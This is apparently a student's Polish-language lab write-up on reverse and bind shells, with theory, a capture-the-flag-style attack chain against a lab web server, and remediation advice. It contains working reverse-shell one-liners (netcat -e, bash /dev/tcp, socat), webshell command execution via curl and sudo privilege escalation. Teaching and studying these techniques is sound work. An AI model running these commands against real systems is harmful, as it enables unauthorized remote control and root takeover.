# 🔐 Zdalne Powłoki — Laboratorium Pentestingowe

> **Zajęcia nr 6 | Polsko-Japońska Akademia Technik Komputerowych**  
> Platforma: HackingDept | Środowisko: Kali Linux + OpenVPN + maszyny wirtualne

---

## 📋 O projekcie

Repozytorium dokumentuje praktyczne laboratoria z zakresu **zdalnych powłok (remote shells)** przeprowadzone w kontrolowanym środowisku pentestingowym. Ćwiczenia obejmują zarówno teorię, jak i praktyczne zadania z wykorzystaniem technik **Reverse Shell** i **Bind Shell**, a następnie zastosowanie tych technik w scenariuszu rzeczywistego testu penetracyjnego z eksploatacją podatnego serwera webowego.

Wszystkie zadania wykonywane były wyłącznie na dedykowanych maszynach laboratoryjnych w izolowanej sieci VPN — zgodnie z zasadami etycznego hackingu i odpowiedzialnego ujawniania podatności.

---

## 🎯 Zakres umiejętności

| Obszar | Techniki / Narzędzia |
|---|---|
| Remote Access | Reverse Shell, Bind Shell |
| Narzędzia sieciowe | `netcat (nc)`, `socat`, `bash TCP redirection` |
| Web Exploitation | Webshell (RCE via PHP), `curl`, `lynx` |
| Privilege Escalation | `sudo` misconfiguration, NOPASSWD |
| Rekonesans | `.bash_history` disclosure, Directory Listing |
| Środowisko | Kali Linux, OpenVPN, SSH |

---

## 🧠 Teoria — Czym są zdalne powłoki?

Zdalna powłoka (ang. *remote shell*) to mechanizm umożliwiający wykonywanie poleceń systemowych na zdalnej maszynie poprzez połączenie sieciowe. W kontekście pentestingu rozróżniamy dwa główne modele:

### Reverse Shell
Scenariusz, w którym **maszyna atakowanego (cel) inicjuje połączenie wychodzące** do maszyny pentestera. Pentester nasłuchuje na wybranym porcie, a po nawiązaniu połączenia otrzymuje dostęp do powłoki działającej na celu.

```
Pentester (nasłuchuje)  ←───────────  Cel (łączy się, uruchamia /bin/bash)
```

**Dlaczego to ważne z perspektywy bezpieczeństwa?**  
Reverse shell omija reguły firewalla, które blokują połączenia przychodzące — ruch wychodzący jest zazwyczaj mniej restrykcyjnie filtrowany. To jedna z najczęstszych technik używanych po uzyskaniu wstępnego dostępu (Initial Access) do systemu.

### Bind Shell
Scenariusz odwrotny — **cel otwiera nasłuchujący port** i wiąże go z powłoką systemową. Pentester aktywnie łączy się z tym portem.

```
Cel (nasłuchuje, uruchamia /bin/bash)  ←───────────  Pentester (łączy się)
```

**Ważna zasada:** W obu przypadkach **powłoka zawsze uruchomiona jest na maszynie celu** — pentester jedynie nią steruje zdalnie.

---

## 🛡️ Zidentyfikowane podatności i wektory ataku

### 1. Podatność: Ekspozycja Webshella (Remote Code Execution)
**Poziom ryzyka:** 🔴 Krytyczny  
**CVE-podobny typ:** CWE-78 (OS Command Injection), CWE-552 (Files or Directories Accessible to External Parties)

**Opis:**  
Na serwerze webowym (Apache 2.4.59 / Debian, IP: `192.168.200.56`) publicznie dostępny był plik `shell.php` umożliwiający wykonanie dowolnych komend systemowych przez parametr GET `?x=<komenda>`. Brak jakiejkolwiek autentykacji ani walidacji danych wejściowych.

**Dowód eksploatacji:**
```bash
curl 'http://192.168.200.56/shell.php?x=id%20webadmin'
# Odpowiedź: uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin),27(sudo)
```

**Jak naprawić:**
- Natychmiastowe usunięcie pliku `shell.php` z serwera produkcyjnego
- Wdrożenie Web Application Firewall (WAF) filtrującego niebezpieczne parametry
- Zasada minimalnych uprawnień — proces serwera webowego nie powinien mieć uprawnień `sudo`
- Regularne skanowanie serwera w poszukiwaniu nieautoryzowanych plików PHP (np. `find /var/www -name "*.php" -newer /etc/apache2/apache2.conf`)

---

### 2. Podatność: Directory Listing + Ujawnienie .bash_history
**Poziom ryzyka:** 🟠 Wysoki  
**Typ:** CWE-548 (Information Exposure Through Directory Listing), CWE-312 (Cleartext Storage of Sensitive Information)

**Opis:**  
Serwer Apache miał włączone listowanie katalogów (`Options Indexes`), co umożliwiło przeglądanie zawartości katalogu webroot. W katalogu głównym znajdował się publicznie dostępny plik `.bash_history` zawierający historię komend wykonywanych przez administratora — w tym polecenie używające webshella, które ujawniło jego istnienie i sposób użycia.

**Dowód eksploatacji (z maszyny pivot):**
```bash
lynx http://192.168.200.56/
# Widoczne pliki: .bash_history, .bash_logout, .bashrc, .profile, shell.php

lynx http://192.168.200.56/.bash_history
# Zawartość: curl 'http://localhost/shell.php?x=id%20webadmin'
```

**Jak naprawić:**
- Wyłączenie directory listing w konfiguracji Apache: `Options -Indexes`
- Pliki konfiguracyjne i historyczne nigdy nie powinny znajdować się w katalogu `DocumentRoot`
- Dodanie reguły w `.htaccess` blokującej dostęp do plików ukrytych (zaczynających się od `.`):
  ```apache
  <FilesMatch "^\.">
      Require all denied
  </FilesMatch>
  ```

---

### 3. Podatność: Misconfiguration SSH — Brak hardening
**Poziom ryzyka:** 🟡 Średni  
**Typ:** CWE-16 (Configuration), CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Opis:**  
Nieprawidłowa konfiguracja SSH może prowadzić do ataków brute-force, przejęcia sesji lub eskalacji uprawnień. Zmiana domyślnego portu (22) na niestandardowy **nie stanowi zabezpieczenia** — jest wyłącznie tzw. "security through obscurity", co przy współczesnych technikach skanowania (np. `nmap -p-`) nie ma żadnej wartości.

**Jak naprawić (hardening SSH):**
```bash
# /etc/ssh/sshd_config — zalecane ustawienia:

PermitRootLogin no              # Zakaz logowania jako root
PasswordAuthentication no       # Wyłączenie uwierzytelniania hasłem
PubkeyAuthentication yes        # Tylko klucze SSH
AllowUsers student admin        # Whitelist użytkowników
MaxAuthTries 3                  # Limit prób logowania
LoginGraceTime 30               # Timeout logowania
```

---

### 4. Podatność: Privilege Escalation via Sudo Misconfiguration (NOPASSWD)
**Poziom ryzyka:** 🔴 Krytyczny  
**Typ:** CWE-269 (Improper Privilege Management)

**Opis:**  
Użytkownik `webadmin` posiadał w pliku `/etc/sudoers` wpis `(ALL) NOPASSWD: ALL`, co oznacza możliwość wykonania dowolnej komendy jako root bez podania hasła. Po uzyskaniu dostępu przez webshell eskalacja do roota wymagała jedynie `sudo su`.

**Łańcuch ataku (Attack Chain):**
```
Directory Listing
      ↓
Odczyt .bash_history  →  odkrycie shell.php
      ↓
RCE przez webshell (uid: webadmin)
      ↓
Bind Shell na porcie 1337
      ↓
sudo su (NOPASSWD)  →  uid: root
      ↓
cat /root/root.txt  →  odczyt flagi
```

**Jak naprawić:**
- Usunięcie `NOPASSWD: ALL` z sudoers — przyznawanie wyłącznie konkretnych, niezbędnych uprawnień
- Zasada minimalnych uprawnień (Principle of Least Privilege)
- Regularne audyty pliku `/etc/sudoers` i `/etc/sudoers.d/`
- Wdrożenie PAM (Pluggable Authentication Modules) i monitorowania eskalacji uprawnień

---

## 🔬 Zrealizowane ćwiczenia

### Moduł 1 — Zdalne powłoki (podstawy)

#### Zadanie 6.1 — Netcat Reverse TCP
Nawiązanie podstawowego połączenia TCP za pomocą `netcat` bez uruchamiania powłoki. Weryfikacja poprawności konfiguracji sieci VPN i nasłuchiwania.

```bash
# Pentester (Kali) — nasłuchuje:
nc -lvp 10001

# Cel — łączy się:
nc <IP_STUDENTA> 10001
```

#### Zadanie 6.2 — Reverse Shell (netcat)
Uruchomienie zdalnej powłoki bash z wykorzystaniem flagi `-e` netcata. Cel inicjuje połączenie i przekazuje `/bin/bash` jako interpreter.

```bash
# Pentester:
nc -lvp 10002

# Cel:
nc <IP_STUDENTA> 10002 -e /bin/bash
```

> **Uwaga techniczna:** Flaga `-e` nie jest dostępna we wszystkich wersjach netcata (np. OpenBSD netcat). W takich przypadkach stosuje się alternatywne techniki z użyciem named pipes (`mkfifo`).

#### Zadanie 6.3 — Reverse Shell (Bash TCP Redirection)
Eksploatacja wbudowanego mechanizmu Bash umożliwiającego otwieranie połączeń TCP jako pseudo-pliki urządzenia (`/dev/tcp`). Technika nie wymaga żadnych zewnętrznych narzędzi poza samym `bash`.

```bash
# Pentester:
nc -lvp 10003

# Cel (bez nc):
bash -i >& /dev/tcp/<IP_STUDENTA>/10003 0>&1
```

> **Dlaczego to ważne:** Ta technika działa na praktycznie każdym systemie z bash — nie wymaga instalacji żadnych dodatkowych narzędzi, co czyni ją bardzo popularną w środowiskach z ograniczonym oprogramowaniem.

#### Zadanie 6.4 — Reverse Shell (socat)
Użycie `socat` — zaawansowanego narzędzia do przekazywania danych między gniazdami. W odróżnieniu od netcata, socat umożliwia uzyskanie w pełni interaktywnego terminala PTY z obsługą strzałek, skrótów klawiszowych i sygnałów (CTRL+C).

```bash
# Pentester:
socat file:`tty`,raw,echo=0 tcp-listen:10004

# Cel:
socat tcp-connect:<IP_STUDENTA>:10004 exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

#### Zadanie 6.5 — Netcat Bind TCP
Odwrotny kierunek — cel nasłuchuje, pentester się łączy.

```bash
# Cel:
nc -lvp 20001

# Pentester:
nc 192.168.100.6 20001
```

#### Zadanie 6.6 — Bind Shell (netcat)
Bind shell z uruchomioną powłoką bash po stronie celu.

```bash
# Cel:
nc -lvp 20002 -e /bin/bash

# Pentester:
nc 192.168.100.6 20002
```

#### Zadanie 6.7 — Bind Shell (socat)
Bind shell z pełnym interaktywnym PTY dzięki socat.

```bash
# Cel:
socat TCP-LISTEN:20003,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Pentester:
socat FILE:`tty`,raw,echo=0 TCP:192.168.100.6:20003
```

---

### Moduł 2 — Pentest scenariuszowy (pełny łańcuch ataku)

#### Zadanie 6.1p — Rekonesans z Lynx (Pivot)
Rozpoznanie docelowego serwera webowego `192.168.200.56` z maszyny pivot (`192.168.100.6`) — serwer PENTEST jest niedostępny bezpośrednio z sieci VPN studenta. Użycie przeglądarki tekstowej `lynx` jako narzędzia rekonesansu w środowisku bez GUI.

```bash
# Na maszynie pivot:
lynx http://192.168.200.56/
# Odkryto: directory listing z plikami .bash_history, shell.php
```

#### Zadanie 6.2p — Information Disclosure (.bash_history)
Odczytanie pliku `.bash_history` publicznie dostępnego przez serwer Apache. Plik zawierał historię komend administratora, ujawniając istnienie i składnię webshella.

```bash
lynx http://192.168.200.56/.bash_history
# Zawartość: curl 'http://localhost/shell.php?x=id%20webadmin'
```

#### Zadanie 6.3p — Remote Code Execution (RCE)
Eksploatacja odkrytego webshella PHP do zdalnego wykonania komend. Parametr `x` przyjmuje komendy systemowe bez żadnej walidacji.

```bash
curl 'http://192.168.200.56/shell.php?x=id%20webadmin'
# Output: uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin),27(sudo)
```

#### Zadanie 6.4p — Upgrade do interaktywnej powłoki (RCE → Bind Shell)
Wykorzystanie webshella do uruchomienia bind shella na porcie 1337. Eskalacja od nieinteraktywnego RCE do pełnej interaktywnej powłoki.

```bash
# Terminal 1 — uruchomienie bind shell przez webshell (URL-encoded):
curl 'http://192.168.200.56/shell.php?x=nc+-e+/bin/bash+-lvp+1337'

# Terminal 2 — połączenie z bind shellem:
nc 192.168.200.56 1337
```

#### Zadanie 6.5p — Privilege Escalation → Root Flag
Eskalacja uprawnień do roota poprzez błędną konfigurację sudo (NOPASSWD: ALL) i odczyt flagi z katalogu `/root`.

```bash
id                    # uid=1001(webadmin) groups=1001(webadmin),27(sudo)
sudo -l               # (ALL) NOPASSWD: ALL
sudo su               # uid=0(root)
cat /root/root.txt    # Flaga: PJATK{FLAGA_Z_ZADANIA}
```

---

## 🔧 Upgrade nieinteraktywnej powłoki (Shell Stabilization)

Po uzyskaniu prostego reverse/bind shella przez `nc` lub `bash` terminal jest zwykle nieinteraktywny — brak obsługi strzałek, TAB, CTRL+C. Poniższa technika umożliwia ulepszenie powłoki:

```bash
# Krok 1 — na zdalnej powłoce: spawning PTY przez Python
python3 -c "import pty; pty.spawn('bash')"

# Krok 2 — CTRL+Z (zawiesza zdalną powłokę, wraca do lokalnego terminala)

# Krok 3 — na lokalnym terminalu: włączenie trybu raw i powrót
stty -echo raw; fg

# Krok 4 (opcjonalnie) — konfiguracja kolorów i rozmiaru terminala
export TERM=xterm-256color
source /etc/skel/.bashrc
stty rows 50 cols 200   # dostosować do rozmiaru swojego terminala (stty -a)
```

---

## 🌐 Środowisko laboratoryjne

```
[Kali Linux (Pentester)]
        |
        | OpenVPN (tun0, 10.x.x.x)
        |
[Maszyna ĆWICZENIA — 192.168.100.6]  ←──── SSH (student/pjatk)
        |
        | Sieć wewnętrzna (niedostępna z VPN)
        |
[Maszyna PENTEST — 192.168.200.56]  ←──── Apache (port 80), shell.php
```

**Konfiguracja VPN:**
```bash
sudo openvpn /sciezka/do/pliku.ovpn
ip addr show | grep tun   # weryfikacja adresu VPN (10.x.x.x)
```

---

## 📚 Źródła i dalsze materiały

- [Reverse Shell vs Bind Shell — qwiet.ai](https://qwiet.ai/attackers-preference-reverse-shell-vs-bind-shell-and-software-supply-chains/)
- [RevShells.com — Generator poleceń reverse shell](https://www.revshells.com/)
- [GTFOBins — Unix binaries exploits](https://gtfobins.github.io/)
- [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- OWASP Top 10: [A03 Injection](https://owasp.org/Top10/A03_2021-Injection/), [A05 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)

---

## ⚠️ Disclaimer

Wszystkie techniki i narzędzia opisane w tym repozytorium były stosowane wyłącznie w celach edukacyjnych, w kontrolowanym środowisku laboratoryjnym (izolowana sieć VPN, dedykowane maszyny wirtualne) za pełną zgodą właściciela infrastruktury (PJATK / HackingDept).

Nieautoryzowane stosowanie opisanych technik na systemach, do których nie posiadasz uprawnień, jest **nielegalne** i podlega odpowiedzialności karnej zgodnie z art. 267 Kodeksu Karnego RP oraz dyrektywą UE 2013/40/UE.

---

*Polsko-Japońska Akademia Technik Komputerowych | Bezpieczeństwo Systemów Komputerowych*
